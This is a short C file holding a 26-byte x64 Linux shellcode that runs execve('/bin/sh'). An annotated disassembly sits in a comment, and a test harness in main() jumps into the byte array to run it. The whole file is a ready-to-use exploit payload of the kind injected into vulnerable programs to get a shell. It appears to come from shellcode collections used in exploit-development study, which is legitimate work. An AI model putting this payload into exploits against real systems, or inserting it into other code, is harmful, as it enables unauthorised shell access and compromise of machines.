#include <stdio.h>

/*

x64 execve /bin/sh -- 26 Bytes -- 12FEB017 -- icon

0:  48 31 f6                xor    rsi,rsi
3:  48 89 f2                mov    rdx,rsi
6:  56                      push   rsi
7:  48 b8 2f 62 69 6e 2f    movabs rax,0x68732f2f6e69622f
e:  2f 73 68
11: 50                      push   rax
12: 48 89 e7                mov    rdi,rsp
15: 6a 3b                   push   0x3b
17: 58                      pop    rax
18: 0f 05                   syscall
*/

char execve_sh[] = \
"\x48\x31\xF6\x48\x89\xF2\x56\x48\xB8\x2F\x62\x69\x6E"
"\x2F\x2F\x73\x68\x50\x48\x89\xE7\x6A\x3B\x58\x0F\x05";

int main(int argc, char **argv){
  int (*test)() = (int(*)())execve_sh;
  test();
}
